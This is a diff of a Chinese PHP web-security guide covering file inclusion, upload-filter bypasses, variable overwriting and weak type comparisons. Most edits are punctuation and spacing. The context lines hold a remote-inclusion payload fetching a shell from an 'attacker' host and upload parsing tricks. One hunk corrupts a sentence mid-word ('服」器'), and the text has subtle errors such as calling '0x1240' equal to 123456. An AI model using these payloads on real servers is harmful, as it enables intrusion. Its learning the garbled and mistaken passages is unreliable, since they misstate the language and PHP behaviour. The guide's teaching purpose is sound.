@@ -4,9 +4,9 @@
 
 常见的导致文件包含的函数有：
 
-- PHP: `include()` `include_once()` `require()` `require_once()` `fopen()` `readfile()` 等
-- JSP / Servlet: `ava.io.File()` `java.io.FileReader()` 等
-- ASP: `include file` `include virtual` 等
+- PHP：`include()` `include_once()` `require()` `require_once()` `fopen()` `readfile()` 等
+- JSP / Servlet：`ava.io.File()` `java.io.FileReader()` 等
+- ASP：`include file` `include virtual` 等
 
 当 PHP 包含一个文件时，会将该文件当做 PHP 代码执行，而不会在意文件时什么类型。
 
@@ -68,7 +68,7 @@ if ($route == "share") {
 require_once "http://attacker/phpshell.txt?/action/m_share.php";
 ```
 
-问号后的部分被解释为 URL 的 querystring，这也是一种”截断“。
+问号后的部分被解释为 URL 的 querystring，这也是一种」截断「。
 
 - 普通远程文件包含
 
@@ -98,11 +98,11 @@ require_once "http://attacker/phpshell.txt?/action/m_share.php";
 
   `?file=http://127.0.0.1/path/xss.php?xss=phpcode`
 
-  需要 `allow_url_fopen=On`，`allow_url_include=On` 并且防火墙或者白名单不允许访问外网时，先在同站点找一个 XSS 漏洞，包含这个页面，就可以注入恶意代码了。
+  需要 `allow_url_fopen=On`，`allow_url_include=On`并且防火墙或者白名单不允许访问外网时，先在同站点找一个 XSS 漏洞，包含这个页面，就可以注入恶意代码了。
 
 ## 文件上传
 
-文件上传漏洞是指用户上传了一个可执行的脚本文件，并通过此文件获得了执行服务器端命令的能力。在大多数情况下，文件上传漏洞一般是指“上传 web 脚本能够被服务器解析”的问题，也就是所谓的 webshell 问题。完成这一攻击需要这样几个条件，一是上传的文件能够这web容器执行，其次用户能从web上访问这个文件，最后，如果上传的文件被安全检查、格式化、图片压缩等功能改变了内容，则可能导致攻击失败。
+文件上传漏洞是指用户上传了一个可执行「脚本文件，并通过此文件获得了执行服」器端命令的能力。在大多数情况下，文件上传漏洞一般是指“上传 web 脚本能够被服务器解析”的问题，也就是所谓的 webshell 问题。完成这一攻击需要这样几个条件，一是上传的文件能够这 web 容器执行，其次用户能从 web 上访问这个文件，最后，如果上传的文件被安全检查、格式化、图片压缩等功能改变了内容，则可能导致攻击失败。
 
 ### 绕过上传检查
 
@@ -124,7 +124,7 @@ require_once "http://attacker/phpshell.txt?/action/m_share.php";
 
   - Apache 解析
 
-    `phpshell.php.rar.rar.rar.rar` 因为Apache不认识 `.rar` 这个文件类型，所以会一直遍历后缀到 `.php`，然后认为这是一个PHP文件。
+    `phpshell.php.rar.rar.rar.rar` 因为 Apache 不认识 `.rar` 这个文件类型，所以会一直遍历后缀到 `.php`，然后认为这是一个 PHP 文件。
 
   - IIS 解析
 
@@ -132,7 +132,7 @@ require_once "http://attacker/phpshell.txt?/action/m_share.php";
 
   - PHP CGI 路径解析
 
-    当访问 `http://www.a.com/path/test.jpg/notexist.php` 时，会将 `test.jpg` 当做 PHP 解析，`notexist.php` 是不存在的文件。此时 Nginx 的配置如下
+    当访问 `http://www.a.com/path/test.jpg/notexist.php` 时，会将 `test.jpg` 当做 PHP 解析，`notexist.php`是不存在的文件。此时 Nginx 的配置如下
 
     ```nginx
     location ~ \.php$ {
@@ -170,7 +170,7 @@ if ($auth) {
 ?>
 ```
 
-当 `register_globals=ON` 时，提交 `test.php?auth=1`，`auth` 变量将自动得到赋值。
+当 `register_globals=ON` 时，提交 `test.php?auth=1`，`auth`变量将自动得到赋值。
 
 ### `extract()` 变量覆盖
 
@@ -359,7 +359,7 @@ $var = "string";
 ?>
 ```
 
-php不会严格检验传入的变量类型，也可以将变量自由的转换类型。
+php 不会严格检验传入的变量类型，也可以将变量自由的转换类型。
 
 比如在 `$a == $b` 的比较中 
 
@@ -387,7 +387,7 @@ $b = 0; //同样为真
 "0e1abc"=="0"  //true
 ```
 
-在进行比较运算时，如果遇到了`0e\d+`这种字符串，就会将这种字符串解析为科学计数法。所以上面例子中2个数的值都是0因而就相等了。如果不满足`0e\d+`这种模式就不会相等。
+在进行比较运算时，如果遇到了`0e\d+`这种字符串，就会将这种字符串解析为科学计数法。所以上面例子中 2 个数的值都是 0 因而就相等了。如果不满足`0e\d+`这种模式就不会相等。
 
 ### 十六进制转换
 
@@ -397,11 +397,11 @@ $b = 0; //同样为真
 "0x1e240"=="1e240" //false
 ```
 
-当其中的一个字符串是 `0x` 开头的时候，PHP 会将此字符串解析成为十进制然后再进行比较，`0x1240` 解析成为十进制就是 123456，所以与 `int` 类型和 `string` 类型的 123456 比较都是相等。
+当其中的一个字符串是 `0x` 开头的时候，PHP 会将此字符串解析成为十进制然后再进行比较，`0x1240`解析成为十进制就是 123456，所以与 `int` 类型和 `string` 类型的 123456 比较都是相等。
 
 ### 类型转换
 
-常见的转换主要就是 `int` 转换为 `string`，`string` 转换为 `int`。
+常见的转换主要就是 `int` 转换为 `string`，`string`转换为 `int`。
 
 **`int` 转 `string`：**
 
@@ -421,7 +421,7 @@ var_dump(intval('3abcd')) //3
 var_dump(intval('abcd')) //0
 ```
 
-说明`intval()`转换的时候，会将从字符串的开始进行转换知道遇到一个非数字的字符。即使出现无法转换的字符串，`intval()`不会报错而是返回0。
+说明`intval()`转换的时候，会将从字符串的开始进行转换知道遇到一个非数字的字符。即使出现无法转换的字符串，`intval()`不会报错而是返回 0。
 
 同时，程序员在编程的时候也不应该使用如下的这段代码：
 
@@ -448,11 +448,11 @@ $array2 = array("foo", "bar", "hello", "world");
 var_dump(md5($array1)==var_dump($array2)); //true
 ```
 
-PHP手册中的md5()函数的描述是`string md5 ( string $str [, bool $raw_output = false ] ) `，`md5()`中的需要是一个string类型的参数。但是当你传递一个array时，`md5()`不会报错，只是会无法正确地求出array的md5值，这样就会导致任意2个array的md5值都会相等。
+PHP 手册中的 md5（）函数的描述是`string md5 ( string $str [, bool $raw_output = false ] ) `，`md5()`中的需要是一个 string 类型的参数。但是当你传递一个 array 时，`md5()`不会报错，只是会无法正确地求出 array 的 md5 值，这样就会导致任意 2 个 array 的 md5 值都会相等。
 
 **strcmp()**
 
-`strcmp()`函数在PHP官方手册中的描述是`int strcmp ( string $str1 , string $str2 )` ,需要给`strcmp()`传递2个`string`类型的参数。如果 `str1`小于`str2`,返回-1，相等返回0，否则返回1。`strcmp()` 函数比较字符串的本质是将两个变量转换为ASCII，然后进行减法运算，然后根据运算结果来决定返回值。
+`strcmp()`函数在 PHP 官方手册中的描述是`int strcmp ( string $str1 ， string $str2 )` ,需要给`strcmp()`传递 2 个`string`类型的参数。如果 `str1`小于`str2`，返回-1，相等返回 0，否则返回 1。`strcmp()`函数比较字符串的本质是将两个变量转换为 ASCII，然后进行减法运算，然后根据运算结果来决定返回值。
 
 如果传入给出`strcmp()`的参数是数字呢？
 
@@ -463,7 +463,7 @@ var_dump(strcmp($array,'123')); //null,在某种意义上null也就是相当于f
 
 **switch()**
 
-如果`switch()`是数字类型的case的判断时，switch会将其中的参数转换为int类型。如下：
+如果`switch()`是数字类型的 case 的判断时，switch 会将其中的参数转换为 int 类型。如下：
 
 ```php
 $i ="2abc";
@@ -478,11 +478,11 @@ case 3:
 }
 ```
 
-这个时候程序输出的是`i is less than 3 but not negative`，是由于`switch()`函数将`$i`进行了类型转换，转换结果为2。
+这个时候程序输出的是`i is less than 3 but not negative`，是由于`switch()`函数将`$i`进行了类型转换，转换结果为 2。
 
 **in_array()**
 
-在PHP手册中，`in_array()`函数的解释是`bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] )` ,如果strict参数没有提供，那么in_array就会使用松散比较来判断`$needle`是否在`$haystack`中。当strince的值为true时，`in_array()`会比较needls的类型和haystack中的类型是否相同。
+在 PHP 手册中，`in_array()`函数的解释是`bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] )` ,如果strict参数没有提供，那么in_array就会使用松散比较来判断`$needle`是否在`$haystack`中。当 strince 的值为 true 时，`in_array()`会比较 needls 的类型和 haystack 中的类型是否相同。
 
 ```php
 $array=[0,1,2,'3'];
@@ -490,7 +490,7 @@ var_dump(in_array('abc', $array)); //true
 var_dump(in_array('1bc', $array)); //true
 ```
 
-可以看到上面的情况返回的都是true,因为`'abc'`会转换为0，`'1bc'`转换为1。
+可以看到上面的情况返回的都是 true，因为`'abc'`会转换为 0，`'1bc'`转换为 1。
 
 `array_search()`与`in_array()`也是一样的问题。
 
